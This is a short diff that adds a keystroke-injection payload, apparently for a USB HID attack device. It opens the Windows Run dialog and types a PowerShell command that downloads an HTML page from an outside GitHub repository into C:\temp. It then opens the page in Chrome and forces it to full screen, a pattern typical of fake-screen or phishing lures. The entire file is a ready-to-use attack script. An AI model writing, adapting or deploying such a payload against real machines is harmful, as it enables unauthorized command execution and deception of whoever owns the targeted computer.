@@ -1,0 +1,8 @@
+GUI r
+DELAY 500
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SAHIBADAS/Prueba_klg/main/index_win.html' -OutFile 'C:\temp\index_win.html'; Start-Process 'chrome' 'C:\temp\index_win.html'"
+ENTER
+DELAY 2000
+ALT TAB
+DELAY 500
+F11
